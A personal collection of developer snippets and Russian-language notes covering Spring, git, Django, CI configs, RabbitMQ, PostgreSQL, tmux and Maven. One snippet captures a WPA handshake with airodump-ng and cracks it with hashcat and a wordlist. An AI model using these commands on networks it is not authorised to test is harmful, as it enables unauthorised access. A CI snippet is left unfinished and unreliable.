import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.annotation.DirtiesContext;
import org.springframework.test.context.junit4.SpringRunner;

import static org.assertj.core.api.Assertions.assertThat;
@RunWith(SpringRunner.class)
@SpringBootTest(properties = {
        "spring.kafka.bootstrap-servers=${spring.embedded.kafka.brokers}",
        "spring.kafka.producer.key-serializer: org.apache.kafka.common.serialization.LongSerializer",
        "spring.kafka.producer.value-serializer: org.apache.kafka.common.serialization.IntegerSerializer"
})
@DirtiesContext
public class CaseUtilTest {

    @Test
    public void shouldSplitCamelCase() {
        Assertions.assertThat(CaseUtil.splitCamelCase("test")).containsOnly("test");
        Assertions.assertThat(CaseUtil.splitCamelCase("testAnotherCase")).containsSequence("test", "another", "case");
        Assertions.assertThat(CaseUtil.splitCamelCase("testABC")).containsOnly("test", "abc");
        Assertions.assertThat(CaseUtil.splitCamelCase("TestTest")).containsOnly("test", "test");
    }
}
==============================================================================================================
git fetch origin master:master
git merge master
git checkout master
git merge --squash topic
git branch -D topic

git config --global commit.template ~/.git-commit-template.txt
git config --global commit.cleanup strip

git branch <name> <commit>
==============================================================================================================
python manage.py check --tag security --tag compatibility. --list-tags
$ python -c "import django; print(django.get_version())"
$ django-admin.py startproject mysite
python manage.py runserver
python manage.py runserver 8080
python manage.py runserver 0.0.0.0:8000

python manage.py startapp polls

BEGIN;
CREATE TABLE polls_question (
    "id" serial NOT NULL PRIMARY KEY,
    "question_text" varchar(200) NOT NULL,
    "pub_date" timestamp with time zone NOT NULL
);

CREATE TABLE polls_choice (
    "id" serial NOT NULL PRIMARY KEY,
    "question_id" integer NOT NULL,
    "choice_text" varchar(200) NOT NULL,
    "votes" integer NOT NULL
);

CREATE INDEX polls_choice_7aa0f6ee ON "polls_choice" ("question_id");

ALTER TABLE "polls_choice"
  ADD CONSTRAINT polls_choice_question_id_246c99a640fbbd72_fk_polls_question_id
    FOREIGN KEY ("question_id")
    REFERENCES "polls_question" ("id")
    DEFERRABLE INITIALLY DEFERRED;
COMMIT;

$ python manage.py shell
python manage.py makemigrations
python manage.py migrate
==============================================================================================================
sudo: required
dist: bionic

language: java

jdk: openjdk11

cache:
  directories:
  - $HOME/.m2
  - $HOME/.bnd/cache/

before_install:
  - echo "MAVEN_OPTS='-Xms1g -Xmx2g'" > ~/.mavenrc
install:
  - |
    function prevent_timeout() {
        local i=0
        while [ -e /proc/$1 ]; do
            # print zero width char every 3 minutes while building
            if [ "$i" -eq "180" ]; then printf %b '\u200b'; i=0; else i=$((i+1)); fi
            sleep 1
        done
    }
    function print_reactor_summary() {
        sed -ne '/\[INFO\] Reactor Summary.*:/,$ p' "$1" | sed 's/\[INFO\] //'
    }
    function mvnp() {
        set -o pipefail # exit build with error when pipes fail
        local command=(mvn $@)
        exec "${command[@]}" 2>&1 | # execute, redirect stderr to stdout
            tee .build.log | # write output to log
            stdbuf -oL grep -aE '^\[INFO\] Building .+ \[.+\]$' | # filter progress
            sed -uE 's/^\[INFO\] Building (.*[^ ])[ ]+\[([0-9]+\/[0-9]+)\]$/\2| \1/' | # prefix project name with progress
            sed -e :a -e 's/^.\{1,6\}|/ &/;ta' & # right align progress with padding
        local pid=$!
        prevent_timeout $pid &
        wait $pid
    }
after_success:
  - print_reactor_summary .build.log
after_failure:
  - tail -n 2000 .build.log
script:
  - mvnp clean verify -B -DskipChecks

==============================================================================================================
echo "renaming bin files with the board name"
rename -v 's:/:-:g' .pio/build/*/*.bin
mkdir toDeploy
rename 's/.pio-build-//' .*.bin
cd .pio/libdeps
echo "zipping libraries per board"
for i in */; do zip -r "${i%/}-libraries.zip" "$i"; done
ls -la
mv *.zip ../../toDeploy
cd ../..
echo "zipping code and licence"
zip -r OpenMQTTGateway_sources.zip main LICENSE.txt
mv *.zip toDeploy
mv *.bin toDeploy
cd toDeploy
ls -la
cd ..

==============================================================================================================
sudo dpkg -i esl-erlang_18.0-1~ubuntu~precise_amd64.deb
sudo dpkg -i rabbitmq-server_3.5.3-1_all.deb
sudo apt-get install -f

sudo service rabbitmq-server status

sudo rabbitmq-plugins enable rabbitmq_management
sudo rabbitmqctl add_user afiskon superpassword
sudo rabbitmqctl set_user_tags afiskon administrator

Заходим на rabbitmq.example.ru:15672, там в первую очередь идем во вкладку Admin и удаляем пользователя guest. Веб-интерфейс RabbitMQ по крутости не уступает веб-интерфейсу Couchbase. Здесь можно смотреть все очереди, все эксченджи, есть красивые графики, вот это все. В качестве домашнего задания можете создать нового пользователя, новый vhost, а затем дать доступ к этому vhost новому пользователю, а также администратору. Без последнего шага вы не сможете смотреть очереди и эксченджи в vhost’е через веб-интерфейс.

sudo sh -c "echo -n CookieFromNode1 > /var/lib/rabbitmq/.erlang.cookie"
Далее:

sudo rabbitmqctl stop_app
sudo rabbitmqctl reset
sudo rabbitmqctl join_cluster rabbit@ip-172-12-23-34
sudo rabbitmqctl start_app
Важно указывать именно доменное имя (ip-172-12-23-34), а не IP, иначе ноды не смогут соединиться.

Проверяем:

sudo rabbitmqctl cluster_status
Должны увидеть что-то вроде:

Cluster status of node 'rabbit@ip-172-45-56-67' ...
[{nodes,[{disc,['rabbit@ip-172-12-23-34','rabbit@ip-172-45-56-67']}]},
 {running_nodes,['rabbit@ip-172-12-23-34','rabbit@ip-172-45-56-67']},
 {cluster_name,<<"rabbit@ip-172-12-23-34.us-west-1.foo.bar">>},
 {partitions,[]}]
В случае проблем изучайте логи в каталоге /var/log/rabbitmq/. Например, частая проблема в мире Erlang — залипший демон epmd. Если команда:

epmd -names
… говорит, что имя rabbitmq зарегистрировано, а вы точно знаете, что сервис сейчас остановлен, epmd нужно прибить:

sudo killall -9 epmd


==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
-- complain if script is sourced in psql
-- rather than via CREATE EXTENSION
\echo USE "CREATE EXTENSION zson" TO LOAD this file. \quit

CREATE TYPE zson;

CREATE TABLE zson_dict (
    dict_id SERIAL NOT NULL,
    word_id INTEGER NOT NULL,
    word TEXT NOT NULL,
    PRIMARY KEY(dict_id, word_id)
);

-- ВАЖНО! Содержимое таблиц расширения по умолчанию не попадает
-- в бэкапы, создаваемые при помощи pg_dump. Для решения этой
-- проблемы нужно явно сказать:
SELECT pg_catalog.pg_extension_config_dump('zson_dict', '');

-- ... и еще много-много кода...
==============================================================================================================
Примите во внимание, что некоторые программы для печати используют консольные утилиты. Например, чтобы распечатать файл, они говорят:

lpr path/to/file.png
Однако это не будет работать, если у вас несколько принтеров. Решается проблема путем установки принтера по умолчанию:

lpoptions -d HP_Deskjet_5700
Список доступных принтеров можно посмотреть так:

lpstat -p -d
==============================================================================================================
sudo add-apt-repository ppa:mumble/release
sudo apt-get update
sudo apt-get install mumble

sudo dpkg-reconfigure mumble-server
==============================================================================================================
lpr -P HP_Deskjet_5700 path/to/file.png
==============================================================================================================
Виртуализация
В последнее время я предпочитаю вместо LXC или KVM использовать VirtualBox. Помимо прочего, он позволяет запускать любые операционные системы и передавать свои виртуалки пользователям ОС, отличных от Linux. Кроме того, я написал для него собственный скрипт-обертку, использующий утилиту vboxmanage. В итоге получился Vagrant, только на православном Python и делающий все так, как мне это удобно.

При установке VirtualBox я выбрал пакет virtualbox-host-modules-arch (там предлагается несколько вариантов). Для загрузки модулей говорим:

sudo modprobe vboxdrv
sudo modprobe vboxnetadp
sudo modprobe vboxnetflt
sudo modprobe vboxpci
Для автоматизации их загрузки создаем /etc/modules-load.d/virtualbox.conf:

vboxdrv
vboxnetadp
vboxnetflt
vboxpci
Если планируете использовать VRDE, также поставьте пакет virtualbox-ext-vnc.
==============================================================================================================
Ситуация исправляется путем создания /etc/X11/xorg.conf.d/70-synaptics.conf:

Section "InputClass"
    Identifier "touchpad"
    Driver "synaptics"
    MatchIsTouchpad "on"
        Option "TapButton1" "1"
        Option "TapButton2" "3"
        Option "TapButton3" "2"
EndSection
==============================================================================================================
lspci | grep -i audio
cat /proc/asound/card*/id
aplay -l
==============================================================================================================
sudo systemctl suspend

sudo nano /etc/systemd/logind.conf
HandleLidSwitch=ignore
HandleLidSwitchDocked=ignore

sudo systemctl restart systemd-logind
==============================================================================================================
cat /sys/class/backlight/intel_backlight/max_brightness
echo 4648 > /sys/class/backlight/intel_backlight/brightness

xbacklight -get
sudo xbacklight -set 50
sudo xbacklight -inc 10
sudo xbacklight -dec 10
==============================================================================================================
heaptrack ./test_rbtree
# или: heaptrack -p PID

heaptrack_print --print-leaks \
  --print-histogram histogram.data \
  --print-massif massif.data \
  --print-flamegraph flamegraph.data \
  --file ./heaptrack.test_rbtree.22023.gz > report.txt
==============================================================================================================
sudo pip install markdown
python -m markdown article.md
python -m markdown article.md -f ~/temp/t.html
==============================================================================================================
command! MarkdownPreview !python -m markdown % -f ~/temp/t.html &&
 \ chromium ~/temp/t.html
command! MarkdownUpdate !python -m markdown % -f ~/temp/t.html

au BufRead *.md set wrap tw=80
==============================================================================================================
#!/bin/sh

set -e

rm ../*.html 2>/dev/null || true
rm -r ../author 2>/dev/null || true
rm -r ../category 2>/dev/null || true
rm -r ../rss 2>/dev/null || true
rm -r ../theme 2>/dev/null || true

pelican --relative-urls --ignore-cache \
  --theme-path template/pelican-simplegrey \
  -o .. content

git add ../*.html

User-agent: *
Disallow: /src/
Crawl-delay: 10
Host: afiskon.github.io
==============================================================================================================
cd path/to/afiskon.github.io
mkvirtualenv pelican
pip install pelican markdown
mkdir src
cd src
pelican-quickstart

pelican --relative-urls --ignore-cache -o .. content
chromium ../index.html
==============================================================================================================
CREATE OR REPLACE FUNCTION make_tsvector(title TEXT, content TEXT)
   RETURNS tsvector AS $$
BEGIN
  RETURN (setweight(to_tsvector('english', title),'A') ||
    setweight(to_tsvector('english', content), 'B'));
END
$$ LANGUAGE 'plpgsql' IMMUTABLE;

CREATE INDEX IF NOT EXISTS idx_fts_articles ON articles
  USING gin(make_tsvector(title, content));

SELECT id, title FROM articles WHERE
  make_tsvector(title, content) @@ to_tsquery('bjarne <-> stroustrup');
  

==============================================================================================================
-- расширение входит в состав PostgreSQL
CREATE EXTENSION pg_trgm;

-- также можно использовать gist
CREATE INDEX articles_trgm_idx ON articles
  USING gin (title gin_trgm_ops);
  
SELECT show_trgm(title) FROM articles LIMIT 3;
SELECT title, similarity(title, 'Straustrup') FROM articles
  WHERE title % 'Straustrup';
  

==============================================================================================================
<plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>properties-maven-plugin</artifactId>
        <version>1.0.0</version>
        <executions>
          <execution>
            <phase>initialize</phase>
            <goals>
              <goal>read-project-properties</goal>
            </goals>
            <configuration>
              <files>
                <file>${basedir}/${propertiesFile}</file>
              </files>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
==============================================================================================================
sudo: false

language: java

jdk:
  - openjdk7

install: mvn -B install -U -DskipTests=true

script: mvn -B verify -U -Dmaven.javadoc.skip=true

after_success:

cache:
  directories:
  - $HOME/.m2

env:
  global:

branches:
  only:
    - master
    
==============================================================================================================
before_install:
 - echo "MAVEN_OPTS='-Xmx2g -XX:+TieredCompilation -XX:TieredStopAtLevel=1'" > ~/.mavenrc

language: java

jdk:
 - oraclejdk8
 
script:
 - mvn clean verify -B -U

after_success:
   - mvn coveralls:report

cache:
  directories:
  - "$HOME/.m2"
==============================================================================================================
# переменную окружения также можно вписать в ~/.bash_profile
export PGINSTALL=~/postgresql-install
export PATH="$PGINSTALL/bin:$PATH"
mkdir -p $PGINSTALL

git clone https://github.com/afiskon/pgscripts.git
git clone git://git.postgresql.org/git/postgresql.git
cd postgresql
git checkout REL_10_BETA2

./configure --prefix=$PGINSTALL # --enable-cassert --enable-debug
make && make check
~/pgscripts/single-install.sh
==============================================================================================================
psql -h 10.128.0.16 -U eax -d eax
screen /dev/ttyUSB0 11520


Утилиты strace и ltrace
Программа strace показывает системные вызовы и их возвраты, что бывает довольно удобно при отладке. С флагом -c она показывает топ системных вызовов, их количество, и сколько времени было проведено в вызове:

$ strace -c pwd
gcc -pg -Wall htable.c htable_test.c -o htable_test
cat test.txt | gprof ./htable_test > profile
sudo perf top -u postgres
sudo perf top -a
sudo perf top -p 12345

==============================================================================================================
			<plugin>
				<groupId>org.eclipse.jetty</groupId>
				<artifactId>jetty-maven-plugin</artifactId>
				<version>9.4.0.v20161208</version>
				<configuration>
					<webAppSourceDirectory>${project.build.directory}/site/allure-maven-plugin</webAppSourceDirectory>
					<stopKey>stop</stopKey>
					<stopPort>1234</stopPort>
				</configuration>
			</plugin>
==============================================================================================================
<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-surefire-plugin</artifactId>
				<version>2.19.1</version>
				<configuration>
					<testFailureIgnore>false</testFailureIgnore>
					<encoding>UTF-8</encoding>
					<inputEncoding>UTF-8</inputEncoding>
					<outputEncoding>UTF-8</outputEncoding>
					<argLine>
						-javaagent:${settings.localRepository}\org\aspectj\aspectjweaver\${aspectj.version}\aspectjweaver-${aspectj.version}.jar
					</argLine>
					<skip>false</skip>
					<suiteXmlFiles>
						<suiteXmlFile>testng1.xml</suiteXmlFile>
					</suiteXmlFiles>
				</configuration>
			</plugin>
==============================================================================================================
pipeline {
    agent { label 'java' }
    parameters {
        booleanParam(name: 'RELEASE', defaultValue: false, description: 'Perform release?')
        string(name: 'RELEASE_VERSION', defaultValue: '', description: 'Release version')
        string(name: 'NEXT_VERSION', defaultValue: '', description: 'Next version (without SNAPSHOT)')
    }
    stages {
        stage('Build') {
            steps {
                sh './mvnw -Dmaven.test.failure.ignore=true clean verify'
            }
        }
        stage('Release') {
            when { expression { return params.RELEASE } }
            steps {
                configFileProvider([configFile(fileId: 'bintray-settings.xml', variable: 'SETTINGS')]) {
                    sshagent(['qameta-ci_ssh']) {
                        sh 'git checkout master && git pull origin master'
                        sh "./mvnw release:prepare release:perform -B -s ${env.SETTINGS} " +
                                "-DreleaseVersion=${params.RELEASE_VERSION} " +
                                "-DdevelopmentVersion=${params.NEXT_VERSION}-SNAPSHOT"
                    }
                }
            }
        }
    }
    post {
        always {
            deleteDir()
        }
        failure {
            slackSend message: "${env.JOB_NAME} - #${env.BUILD_NUMBER} failed (<${env.BUILD_URL}|Open>)",
                    color: 'danger', teamDomain: 'qameta', channel: 'allure', tokenCredentialId: 'allure-channel'
        }
    }
}
==============================================================================================================
Getting Plugin Configuration Information
license-list goal
This goal displays a list of available licenses.

Use it directly (and only) from commandline :

  mvn license:license-list
To display the license header, use the detail parameter :

  mvn license:license-list -Ddetail
For more information, see the examples and for full detail see detail page.

comment-style-list goal
This goal displays the available comment styles to box file header.

Use it directly (and only) from commandline :

  mvn license:comment-style-list
To display the example, use the detail parameter :

  mvn license:comment-style-list -Ddetail
For more information, see the examples and for full detail see detail page.

help goal
This goal display the help of the plugin (available goals).

Use it directly (and only) from commandline :

  mvn license:help
To display verbose help :

  mvn license:help -Ddetail
==============================================================================================================
echo "RUN THE PROJECT IN THE SERVER/LOCAL"

echo "Compiling while skipping tests ..."
./mvnw clean install -DskipTests
echo "Compilation finished"

echo "Kill the process on port 8080, to undeploy the former version if existing"
sudo kill $(sudo lsof -t -i:8080)

echo "Let's deploy the new version silently"
nohup ./mvnw spring-boot:run &
==============================================================================================================
public class BaseStory extends JUnitStory {

    @Override
    public Configuration configuration() {
        if (super.hasConfiguration()) {
            return super.configuration();
        }
        return new MostUsefulConfiguration()
                .useStoryReporterBuilder(new StoryReporterBuilder()
                        .withDefaultFormats()
                        .withFormats(CONSOLE)
                        .withReporters(new AllureReporter()));
    }

}
==============================================================================================================
public class Rand7UsingRand5 {

	public int rand7(){
		int r = (rand5()-1)*5 + rand5();
		while(r > 21){   // I just need to ignore [22, 25] 
			r = (rand5()-1)*5 + rand5();
		}
		return (r%7) + 1;
	}
	
	private int rand5(){
		return (int)(Math.ceil(Math.random()*5));
	}
	
	public static void main(String args[]){
		Rand7UsingRand5 rr = new Rand7UsingRand5();
		for(int i=0; i < 10; i++){
			System.out.print(rr.rand7());
		}
	}
}
==============================================================================================================
import com.arangodb.springframework.annotation.Query;
import com.arangodb.springframework.repository.ArangoRepository;
import xyz.dassiorleando.arangodb.domain.Article;

import java.util.List;

/**
 * Article repository
 * @author dassiorleando
 */
public interface ArticleRepository extends ArangoRepository<Article, String> {

    // Supposing that article is the collection name to perform the query on
    @Query("FOR a IN article FILTER a.title == @0 RETURN a")
    Iterable<Article> getArticleByTitle(String title);

    Iterable<Article> findByTitle(String title);

}
==============================================================================================================
import java.util.UUID;
import java.util.concurrent.SubmissionPublisher;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.Stream;

public class OverProducingPublisher extends SubmissionPublisher<StockData> {

  public void start() {
    Stream<StockData> stockDataStream = Stream
        .generate(() ->
            new StockData(
                UUID.randomUUID().toString(),
                ThreadLocalRandom.current().nextFloat()
            )
        );


    stockDataStream.limit(100_000).forEach(this::submit);
  }


}
==============================================================================================================
import com.tomekl007.restapps.domain.DeliveryItem;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;

@Component
public class DeliveryServiceReactiveWrapper {
  private DeliveryServiceRepository deliveryServiceRepository;

  @Autowired
  public DeliveryServiceReactiveWrapper(DeliveryServiceRepository deliveryServiceRepository) {

    this.deliveryServiceRepository = deliveryServiceRepository;
  }

  public Mono<DeliveryItem> save(DeliveryItem deliveryItem) {
    return Mono.just(deliveryItem).map(d -> deliveryServiceRepository.save(d));
  }

  public Flux<DeliveryItem> getByItemName(String itemName) {
    return Flux.fromIterable(deliveryServiceRepository.findByItemName(itemName));
  }
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================

[submodule "sdk/proto"]
	path = sdk/proto
	url = https://github.com/dronecore/DroneCore-Proto.git
==============================================================================================================
sudo apt-get install postgis qgis osm2pgsql
sudo -u postgres psql
==============================================================================================================
GET /api/v1.0/users?fields=id,email,url&offset=100&limit=10&order_by=id
GET /api/v1.0/logs?from=2013-01-01+00:00:00&to=2013-12-31+23:59:59
==============================================================================================================
curl ... | sed 's/},/}\n/g'
==============================================================================================================
sudo service riak start
/var/log/riak/console.log
==============================================================================================================
curl -H 'Accept: application/x-json-stream' \
  http://localhost/api/v1.0/streams/users -N

{"type":"user","data":{"id":123,"name":"Alex","url":"http://eax.me/"}}
{"type":"user","data":{"id":456,"name":"Bob","url":"http://ya.ru/"}}
...
{"type":"sync"}
{"type":"heartbeat"}
{"type":"heartbeat"}
{"type":"user_deleted","data":{"id":123}}
...
==============================================================================================================
Выбираем используемый метод:

-X{GET|PUT|POST|DELETE}
Указываем тело запроса:

-d '{"name":"Alex","url":"http://eax.me/"}'
Если тело запроса большое, можно сохранить его в файл и сказать:

-d @filename.json
# чтобы при этом не удалялись символы новой строки:
--data-binary @filename.json
Выводим заголовки из ответа сервера в stdout:

-D -
Говорим передавать данные в gzip’е:

--compressed
Сохраняем тело ответа в указанный файл вместо stdout:

-o output.json
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
akka {
  loglevel = "INFO"

  actor {
    provider = "akka.cluster.ClusterActorRefProvider"
    debug {
      receive = on
      lifecycle = off
    }
  }

  remote {
    log-remote-lifecycle-events = off
    netty.tcp {
      hostname = "127.0.0.1"
      port = 2551
    }
  }

  cluster {
    min-nr-of-members = 2
    auto-down-unreachable-after = 10s

    seed-nodes = [
      "akka.tcp://system@127.0.0.1:2551"
    ]
  }
}
==============================================================================================================
mkdir temp
sudo airodump-ng -c 6 --bssid 'BE:EF:C0:FF:FE:42' -w temp/ wlp2s0mon

sudo pacman -S hashcat hashcat-utils

cap2hccapx temp/-01.cap temp/-01.hccapx
hashcat -m 2500 temp/-01.hccapx rockyou.txt
==============================================================================================================
sudo pacman -S sshuttle
https://eax.me/sshuttle/

#!/bin/sh

set -e

USER=eax
SERVER=11.22.33.44
DNS=8.8.8.8

mv /etc/resolv.conf /etc/resolv.conf.sshuttle-$SERVER.bak
echo "nameserver $DNS" > /etc/resolv.conf
sshuttle --dns -r $USER@$SERVER -x $SERVER 0/0 || true
mv /etc/resolv.conf.sshuttle-$SERVER.bak /etc/resolv.conf

chmod u+x ./vpn.sh
sudo ./vpn.sh
==============================================================================================================
 если у вас Ubuntu:
sudo apt-get install doxygen

# если у вас Arch Linux:
sudo pacman -S doxygen
doxygen -g
Имя проекта:

PROJECT_NAME           = "Project Name"
Версия проекта:

PROJECT_NUMBER         = 0.1
Краткое описание проекта:

PROJECT_BRIEF          = "Yet another NoSQL DBMS"
Куда писать сгенеренные доки:

OUTPUT_DIRECTORY       = doxygen
Отключаем LaTeX, так как HTML обычно достаточно:

GENERATE_LATEX         = NO
Где искать файлы, из которых генерировать документацию — список файлов и директорий через пробел:

INPUT                  = src include
Включаем рекурсивный обход директорий:

RECURSIVE              = YES
==============================================================================================================
==============================================================================================================
==============================================================================================================
# with an AUR helper, e. g. pacaur:
pacaur -S ceylon
# manually:
git clone https://aur.archlinux.org/ceylon
cd ceylon
makepkg
sudo pacman -U ceylon-1.3.3-*.pkg*
==============================================================================================================
visualvm -cp:a ./jmxremote_optional-repackaged-5.0.jar

JVM_OPTS="$JVM_OPTS -Dcassandra.jmxmp"
/usr/bin/cassandra -e -f

nodetool --jmxmp status
==============================================================================================================
Cd bj = new Cd("basement_jaxx_singles");
Cd mr = new Cd("maria rita");
		
List<Cd> order = new ArrayList<Cd>();
order.add(mr);
// добавим два раза один и тот же объект (две ссылки на один и тот же объект)
order.add(bj);
order.add(bj);

// добавим в список сам список (закольцовывание)
order.add(order);

XStream xstream = new XStream();
xstream.alias("cd", Cd.class);
System.out.println(xstream.toXML(order));
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
graphite:
  -
    period: 60
    timeunit: 'SECONDS'
    hosts:
     - host: 'graphite-server.domain.local'
       port: 2003
    predicate:
      color: "white"
      useQualifiedName: true
      patterns:
        - "^org.apache.cassandra.metrics.Cache.+"
        - "^org.apache.cassandra.metrics.ClientRequest.+"
        - "^org.apache.cassandra.metrics.Storage.+"
        - "^org.apache.cassandra.metrics.ThreadPools.+"
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
Так исторически сложилось, что для сохранения сессии при работе по SSH или чего-то такого обычно я использую screen. Но бывает, например, что ты работаешь с машиной, где у тебя нет рутовых прав, и где не установлен screen, но зато есть tmux. Поскольку я плохо помню сочетания клавиш tmux, то решил выписать их для себя в виде небольшой шпаргалки.

Итак, основные хоткеи следующие:

Ctr+B, ?	Показать все доступные хоткеи
Ctr+B, C	Создать окно
Ctr+B, N	Следующее окно
Ctr+B, P	Предыдущее окно
Ctr+B, [0-9]	Перейти к окну с данным номером
Ctr+B, X	Закрыть окно
Ctr+B, %	Горизонтальное разделение
Ctr+B, "	Вертикальное разделение
Ctr+B, стрелочки	Переход между разделениями
Ctr+B, запятая	Переименовать окно
Ctr+B, W	Список всех окон с переключением
Ctr+B, Fn+вверх	Скролинг, можно использовать точпад
Ctr+B, $	Переименовать текущую сессию
Ctr+B, D	Detach, отсоединиться от сессии
 

Список доступных сессий можно посмотреть командой:

tmux ls
Подключение к сессии:

tmux attach -t 0
Сессиям можно давать осмысленные имена и запускать в них фоновые задачи:

# создать фоновую сессию
tmux new-session -d -s background-task 'watch date'
# подсоединиться к сессии
tmux attach -t background-task
# прибить сессию
tmux kill-session -t background-task
Это иногда бывает удобно в каких-нибудь скриптах. Характерно, что в screen подобный функционал тоже заявлен, но последний раз, когда я проверял, он был сломан.

Интересно также, что в отличие от screen, в tmux нет возможности работать с последовательными портами. Но если вы решите полностью переходить на tmux, то для этой задачи можете воспользоваться утилитой cu:

cu -l /dev/tty.usbserial -s 115200
В общем-то, это все, о чем я хотел сегодня рассказать. Надеюсь, вы нашли эту информацию полезной.
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
on: push
jobs:
  test:
    strategy:
      matrix:
        platform: [ubuntu-latest, macos-latest, windows-latest]
    runs-on: ${{ matrix.platform }}
    steps:
    - uses: actions/checkout@v1
    - uses: actions/setup-node@v1
      with:
        version: 12
    - run: npm install-ci-test
    - uses:











  publish:
    needs: [build]
    steps:
    - uses: actions/checkout@v1
==============================================================================================================
    private static class Uuids {

        private final Map<TestIdentifier, String> storage = new ConcurrentHashMap<>();
        private final ReadWriteLock lock = new ReentrantReadWriteLock();

        public Optional<String> get(final TestIdentifier testIdentifier) {
            try {
                lock.readLock().lock();
                return Optional.ofNullable(storage.get(testIdentifier));
            } finally {
                lock.readLock().unlock();
            }
        }

        private String getOrCreate(final TestIdentifier testIdentifier) {
            try {
                lock.writeLock().lock();
                return storage.computeIfAbsent(testIdentifier, ti -> UUID.randomUUID().toString());
            } finally {
                lock.writeLock().unlock();
            }
        }
    }
==============================================================================================================
 <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-shade-plugin</artifactId>
                <version>1.4</version>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>shade</goal>
                        </goals>
                        <configuration>
                            <transformers>
                                <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
                                    <mainClass>ovh.not.javamusicbot.MusicBot</mainClass>
                                </transformer>
                            </transformers>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
==============================================================================================================
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt</artifactId>
    <version>0.6.0</version>
</dependency>

		sigAlgs.put("HS256", "HMACSHA256");
		sigAlgs.put("HS384" , "HMACSHA384");
		sigAlgs.put("HS512" , "HMACSHA512");
		sigAlgs.put("RS256" , "SHA256withRSA");
		sigAlgs.put("RS512" , "SHA512withRSA");

		keyAlgs.put("RSA1_5" , "RSA/ECB/PKCS1Padding");
==============================================================================================================<settings xmlns="http://maven.apache.org/SETTINGS/1.1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.1.0 http://maven.apache.org/xsd/settings-1.1.0.xsd">
  <servers>
    <server>
      <id>ossrh</id>
      <username>rsmckinney</username>
      <password>${env.MAN_PASS_PHRASE}</password>
    </server>
  </servers>

  <profiles>
    <profile>
      <id>ossrh</id>
      <activation>
        <activeByDefault>true</activeByDefault>
      </activation>
      <properties>
        <gpg.passphrase>${env.MAN_PASS_PHRASE}</gpg.passphrase>
      </properties>
    </profile>
  </profiles>

</settings>
==============================================================================================================
package com.paragon.microservices.distributor.system.configuration;

import com.paragon.microservices.distributor.system.handler.CustomRestTemplate;
import com.paragon.microservices.distributor.system.handler.RestClientHttpRequestInterceptor;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.boot.web.client.RestTemplateCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.http.client.ClientHttpRequestInterceptor;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.web.client.RestTemplate;

import java.util.List;

@Configuration
@Description("Paragon MicroServices Commons RestTemplate interceptor configuration")
public class RestTemplateInterceptorConfiguration {

    @Bean
    @Description("Custom RestTemplate request interceptor customizer bean")
    public RestTemplateCustomizer customRestTemplateRequestInterceptorCustomizer(final List<ClientHttpRequestInterceptor> interceptors) {
        return restTemplate -> restTemplate.getInterceptors().addAll(interceptors);
    }

    @Bean
    @Description("Default client HTTP request interceptor bean")
    public ClientHttpRequestInterceptor defaultClientHttpRequestInterceptor() {
        return new RestClientHttpRequestInterceptor();
    }

    @Bean
    @Description("Default RestTemplate builder bean")
    public RestTemplateBuilder restTemplateBuilder(final List<HttpMessageConverter<?>> converters,
                                                   final List<RestTemplateCustomizer> customizers) {
        RestTemplateBuilder builder = new RestTemplateBuilder();
        builder = builder.additionalMessageConverters(converters);
        builder = builder.additionalCustomizers(customizers);
        return builder;
    }

    @Bean
    @Description("Custom RestTemplate bean")
    public RestTemplate restTemplate(final RestTemplateBuilder restTemplateBuilder,
                                     final CustomRestTemplate customRestTemplate) {
        return restTemplateBuilder.configure(customRestTemplate);
    }
}

==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
https://www.jianshu.com/p/1761842427cc
https://www.baeldung.com/java-char-encoding
==============================================================================================================

public class CharsetDemo
{
   /**
    * Supplies the default encoding without using Charset.defaultCharset()
    * and without accessing System.getProperty("file.encoding").
    *
    * @return Default encoding (default charset).
    */
   public static String getEncoding()
   {
      final byte [] bytes = {'D'};
      final InputStream inputStream = new ByteArrayInputStream(bytes);
      final InputStreamReader reader = new InputStreamReader(inputStream);
      final String encoding = reader.getEncoding();
      return encoding;
   }
   public static void main(final String[] arguments)
   {
      out.println("Default Locale:   " + Locale.getDefault());
      out.println("Default Charset:  " + Charset.defaultCharset());
      out.println("file.encoding;    " + System.getProperty("file.encoding"));
      out.println("sun.jnu.encoding: " + System.getProperty("sun.jnu.encoding"));
      out.println("Default Encoding: " + getEncoding());
   }
}
==============================================================================================================
